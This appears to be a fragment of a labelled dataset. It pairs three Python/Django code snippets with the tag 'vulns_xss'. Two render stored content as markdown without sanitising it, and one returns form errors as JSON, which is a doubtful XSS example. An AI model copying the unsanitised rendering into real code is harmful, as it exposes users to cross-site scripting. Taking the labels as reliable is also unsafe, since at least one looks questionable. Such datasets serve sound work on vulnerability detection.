"            i.md = markdown(i.content, extensions=[                'markdown.extensions.extra',                'markdown.extensions.codehilite',                'markdown.extensions.toc',            ])",vulns_xss
"        context['md'] = markdown(self.object.content,                                 extensions=[                                     'markdown.extensions.extra',                                     'markdown.extensions.codehilite',                                     'markdown.extensions.toc',                                 ])",vulns_xss
        return HttpResponseBadRequest(form.errors.as_json()),vulns_xss
